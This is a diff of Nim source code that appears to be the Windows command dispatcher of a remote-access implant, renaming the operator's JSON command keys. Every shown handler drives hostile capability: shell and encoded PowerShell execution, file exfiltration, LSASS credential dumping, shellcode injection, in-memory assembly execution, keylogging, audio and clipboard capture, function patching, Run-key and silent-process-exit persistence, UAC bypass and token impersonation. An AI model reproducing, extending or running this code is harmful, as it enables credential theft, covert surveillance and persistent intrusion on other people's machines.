@@ -749,39 +749,37 @@ proc windows_parse_command*(command: JsonNode): bool =
     case command_type:
         # for external common procs - pass the http client as first argument
         of protectString("cmd"):
-            is_success = run_shell_command(client, command[protectString("shell_command")].getStr())
+            is_success = run_shell_command(client, command[protectString("command")].getStr())
         of protectString("iex"):
             # direct iex
             if not contains(command, protectString("ps_module")):
-                is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr())
+                is_success = wrap_execute_encoded_powershell(command[protectString("epc")].getStr())
             # ps_modules
             else:
                 is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr(), command[protectString("ps_module")].getStr())
         of protectString("spawn"):
             is_success = spawn_wmi(command[protectString("cmdline")].getStr())
         of protectString("download"):
-            is_success = exfil_file(client, command[protectString("src_file")].getStr())
+            is_success = exfil_file(client, command[protectString("src")].getStr())
         of protectString("upload"):
-            is_success = write_file(client, command[protectString("src_file_data_base64")].getStr(), command[protectString("dst_file_path")].getStr())            
+            is_success = write_file(client, command[protectString("src_b64")].getStr(), command[protectString("dst")].getStr())            
         of protectString("regenumkeys"):
             is_success = wrap_regenumkeys(command[protectString("key")].getStr())
         of protectString("regenumvalues"):
             is_success = wrap_regenumvalues(command[protectString("key")].getStr())
         of protectString("regread"):
             is_success = wrap_regread(command[protectString("key")].getStr(), command[protectString("value")].getStr())
-        of protectString("regdelete"):
-            if command.contains(protectString("value")):
-                is_success = wrap_regdelete(command[protectString("key")].getStr(), command[protectString("value")].getStr())
-            else:
-                is_success = wrap_regdelete(command[protectString("key")].getStr())
-        of protectString("regwrite"):
-            if command.contains(protectString("value")):
-                if command[protectString("type")].getStr() == "s": # string
-                    is_success = wrap_regwrite(command[protectString("key")].getStr(), command[protectString("value")].getStr(), command[protectString("data")].getStr())
-                elif command[protectString("type")].getStr() == "d": # dword
-                    is_success = wrap_regwrite(command[protectString("key")].getStr(), command[protectString("value")].getStr(), cast[DWORD](command[protectString("data")].getInt()))
-            else:
-                is_success = wrap_regwrite(command[protectString("key")].getStr())
+        of protectString("regdeletekey"):
+            is_success = wrap_regdelete(command[protectString("key")].getStr())
+        of protectString("regdeletevalue"):
+            is_success = wrap_regdelete(command[protectString("key")].getStr(), command[protectString("value")].getStr())
+        of protectString("regwritekey"):
+            is_success = wrap_regwrite(command[protectString("key")].getStr())
+        of protectString("regwritevalue"):
+            if command[protectString("type")].getStr() == "s": # string
+                is_success = wrap_regwrite(command[protectString("key")].getStr(), command[protectString("value")].getStr(), command[protectString("data")].getStr())
+            elif command[protectString("type")].getStr() == "d": # dword
+                is_success = wrap_regwrite(command[protectString("key")].getStr(), command[protectString("value")].getStr(), cast[DWORD](command[protectString("data")].getInt()))
         of protectString("checksec"):
             is_success = checksec()
         of protectString("clipboard"):
@@ -791,21 +789,21 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("windows"):
             is_success = enum_visible_windows()
         of protectString("audio"):
-            is_success = wrap_record_audio(command[protectString("record_time")].getInt())
-        of protectString("lsass-examine"):
-            is_success = wrap_examine_lsass()
+            is_success = wrap_record_audio(command[protectString("time")].getInt())
         of protectString("lsass"):
-            var dump_method = command[protectString("dump_method")].getStr()
-            if dump_method == protectString("eviltwin"):
+            var dump_method = command[protectString("subcommand")].getStr()
+            if dump_method == protectString("examine"):
+                is_success = wrap_examine_lsass()
+            elif dump_method == protectString("eviltwin"):
                 is_success = wrap_evil_lsass_twin()
             else:
                 is_success = dump_lsass(dump_method)
         of protectString("shellc"):
-            is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command[protectString("pid")].getInt())
+            is_success = wrap_inject_shellc(command[protectString("sh_b64")].getStr(), command[protectString("pid")].getInt())
         of protectString("assembly"):
-            is_success = wrap_execute_assembly(command[protectString("assembly_base64")].getStr(), command[protectString("assembly_args")].getStr())
+            is_success = wrap_execute_assembly(command[protectString("as_b64")].getStr(), command[protectString("args")].getStr())
         of protectString("keylog"):
-            var keylog_action = command[protectString("action")].getStr()
+            var keylog_action = command[protectString("subcommand")].getStr()
             if keylog_action == protectString("start"):
                 is_success = wrap_keylog_start()
             elif keylog_action == protectString("dump"):
@@ -813,13 +811,13 @@ proc windows_parse_command*(command: JsonNode): bool =
             if keylog_action == protectString("stop"):
                 is_success = wrap_keylog_stop()                                
         of protectString("patch"):
-            is_success = wrap_patch_func(command[protectString("patch_func")].getStr())
+            is_success = wrap_patch_func(command[protectString("func")].getStr())
         of protectString("persist-run"):
-            is_success = set_run_key(command[protectString("key_name")].getStr(), command[protectString("persist_command")].getStr())
+            is_success = set_run_key(command[protectString("key")].getStr(), command[protectString("cmd")].getStr())
         of protectString("persist-spe"):
-            is_success = set_spe(command[protectString("process_name")].getStr(), command[protectString("persist_command")].getStr())
+            is_success = set_spe(command[protectString("pn")].getStr(), command[protectString("cmd")].getStr())
         of protectString("uac-bypass"):
-            is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr())
+            is_success = uac_bypass(command[protectString("method")].getStr(), command[protectString("cmd")].getStr())
         of protectString("impersonate"):
             var pid = command[protectString("pid")].getInt()
             is_success = wrap_token_funcs(command_type, pid)
@@ -840,9 +838,9 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("speak"):
             is_success = speak(command["text"].getStr())
         of protectString("critical"):
-            is_success = wrap_set_critical(parseBool(command[protectString("is_critical")].getStr()))
+            is_success = wrap_set_critical(parseBool(command[protectString("enable")].getStr()))
         of protectString("sleep"):
-            is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
+            is_success = change_sleep_time(client, command[protectString("sleep")].getInt(), command[protectString("jitter")].getInt())
         of protectString("collect"):
             is_success = collect_data()
         of protectString("die"):
